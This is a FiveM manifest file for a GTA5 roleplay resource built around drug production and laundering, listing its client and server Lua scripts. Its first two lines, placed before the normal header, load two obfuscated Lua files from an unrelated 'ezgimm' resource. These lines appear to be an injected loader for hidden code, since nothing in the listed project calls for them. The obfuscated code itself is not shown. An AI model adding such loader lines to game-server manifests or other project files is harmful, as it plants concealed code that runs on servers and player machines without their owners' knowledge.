shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'


fx_version "cerulean"
game "gta5"
lua54 "yes"

client_script {
    "client/coke.lua",
    "client/corner_holding.lua",
    "client/editable_client.lua",
    "client/laundry.lua",
    "client/meth.lua",
    "client/weed.lua",
    "config.lua",
}
server_scripts {
    "server/editable_server.lua",
    "server/server.lua",
    "config.lua",
}
lua54 'yes'
dependency '/assetpacks'